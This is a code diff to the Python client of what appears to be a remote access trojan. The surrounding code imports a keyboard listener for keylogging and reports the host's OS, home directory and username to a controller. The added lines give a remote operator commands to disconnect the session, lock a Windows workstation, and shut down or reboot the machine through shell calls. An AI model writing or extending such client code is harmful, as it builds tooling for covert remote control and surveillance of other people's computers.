@@ -18,6 +18,9 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding, rsa
 
+if platform.system() == 'Windows':
+    import ctypes
+
 try:
     from pynput.keyboard import Key, Listener
     _pynput = True
@@ -223,7 +226,38 @@ class Client(object):
 
             if data[0] == '<INFO>':
                 self.send(json.dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]).encode())
-                continue 
+                continue
+
+            if data[0] == '--x':
+                if data[1] == '1':
+                    self.send(b'Restarting Session...')
+                    break
+                if data[1] == '2':
+                    self.send(b'Disconnecting Client...')
+                    self.socket.close()
+                    sys.exit(0)
+
+            if data[0] == '--q':
+                if data[1] == '1':
+                    if platform.system() == 'Windows':
+                        self.send(b'Locked Client Machine')
+                        ctypes.windll.user32.LockWorkStation()
+                    else:
+                        self.send(b'Desktop Locking is only avaliable on Windows Clients.')
+                    continue
+                elif data[1] == '2':
+                    if platform.system() == 'Windows':
+                        subprocess.Popen('shutdown /s /t 0', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    else:
+                        subprocess.Popen('shutdown -h now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                elif data[1] == '3':
+                    if platform.system() == 'Windows':
+                        subprocess.Popen('shutdown /r /t 0', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    else:
+                        subprocess.Popen('reboot now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                time.sleep(5)
+                # If shutdowns or restarts didn't work
+                break
 
             if data[0] == '--l':
                 self.socket.send(b' ')
